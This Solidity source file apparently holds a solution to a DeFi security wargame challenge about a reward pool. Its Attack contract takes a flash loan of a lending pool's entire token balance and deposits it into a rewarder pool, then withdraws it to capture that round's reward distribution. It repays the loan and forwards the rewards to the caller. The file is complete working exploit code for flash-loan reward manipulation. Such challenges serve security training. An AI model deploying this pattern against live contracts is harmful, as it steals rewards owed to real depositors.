// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;

    function distributeRewards() external returns (uint256 rewards);

    function isNewRewardsRound() external view returns (bool);

    // * view / pure functions
    function roundNumber() external view returns (uint64);
}

contract Attack {
    IFlashLoanerPool public immutable flashLoadPool;
    ITheRewarderPool public immutable rewarderPool;
    address public immutable liquidityToken;
    address public immutable rewardToken;

    constructor(
        IFlashLoanerPool _flashLoadPool,
        address _liquidityTokenAddress,
        ITheRewarderPool _rewarderPool,
        address _rewardToken
    ) {
        flashLoadPool = _flashLoadPool;
        liquidityToken = _liquidityTokenAddress;
        rewarderPool = _rewarderPool;
        rewardToken = _rewardToken;
    }

    function attack() external {
        uint256 balance = IERC20(liquidityToken).balanceOf(
            address(flashLoadPool)
        );
        flashLoadPool.flashLoan(balance);

        IERC20(rewardToken).transfer(
            msg.sender,
            IERC20(rewardToken).balanceOf(address(this))
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        IERC20(liquidityToken).approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        IERC20(liquidityToken).transfer(address(flashLoadPool), amount);
    }

    receive() external payable {}
}
